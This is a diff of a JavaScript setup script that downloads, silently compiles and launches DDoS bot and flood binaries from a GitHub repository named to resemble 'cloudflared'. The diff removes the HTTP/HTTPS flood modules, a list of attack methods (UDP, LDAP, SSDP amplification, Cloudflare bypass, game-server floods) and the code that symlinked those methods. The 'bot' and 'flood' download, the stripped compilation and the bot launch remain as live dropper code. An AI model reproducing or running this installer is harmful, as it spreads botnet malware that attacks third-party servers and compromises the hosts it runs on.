@@ -15,24 +15,12 @@ const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main
 const FILES_TO_DOWNLOAD = [
     { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
     { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
-    { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
-    { url: `${REPO_BASE}/bots/https`, filename: 'https', executable: true },
     { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
 ];
 
 const SOURCE_FILES = [
     { url: `${REPO_BASE}/bots/bot.cpp`, filename: 'bot.cpp' },
-    { url: `${REPO_BASE}/bots/flood.cpp`, filename: 'flood.cpp' },
-    { url: `${REPO_BASE}/bots/http.cpp`, filename: 'http.cpp' },
-    { url: `${REPO_BASE}/bots/https.cpp`, filename: 'https.cpp' }
-];
-
-const METHODS = [
-    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
-    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
-    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
-    'subnet', 'icmp',
-    'http', 'https', 'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
+    { url: `${REPO_BASE}/bots/flood.cpp`, filename: 'flood.cpp' }
 ];
 
 function downloadHttp(url, destPath) {
@@ -116,37 +104,11 @@ function tryNativeCompilation(targetDir) {
     try {
         execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -static-libstdc++ -static-libgcc -o bot bot.cpp`, { cwd: targetDir, stdio: 'ignore' });
         execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o flood flood.cpp ${sslFlag}`, { cwd: targetDir, stdio: 'ignore' });
-        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o http http.cpp`, { cwd: targetDir, stdio: 'ignore' });
-        if (hasSsl) {
-            execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o https https.cpp -lssl -lcrypto`, { cwd: targetDir, stdio: 'ignore' });
-        }
         return true;
     } catch (err) {
         console.warn(`[!] Native compilation warning: ${err.message}`);
         return false;
     }
-}
-
-function createMethodLinks(targetDir) {
-    const floodPath = path.join(targetDir, 'flood');
-    if (!fs.existsSync(floodPath)) return;
-
-    console.log('[*] Setting up method symlinks for flood.cpp...');
-    for (const m of METHODS) {
-        const linkPath = path.join(targetDir, m);
-        try {
-            if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
-            fs.symlinkSync('flood', linkPath);
-        } catch (_) {
-            try {
-                fs.copyFileSync(floodPath, linkPath);
-                fs.chmodSync(linkPath, 0o755);
-            } catch (err) {
-                console.error(`[!] Failed to link method ${m}: ${err.message}`);
-            }
-        }
-    }
-    console.log('[+] All method links ready.');
 }
 
 async function setup() {
@@ -182,8 +144,6 @@ async function setup() {
             }
         }
     }
-
-    createMethodLinks(targetDir);
 
     const botBinPath = path.join(targetDir, 'bot');
     if (fs.existsSync(botBinPath)) {
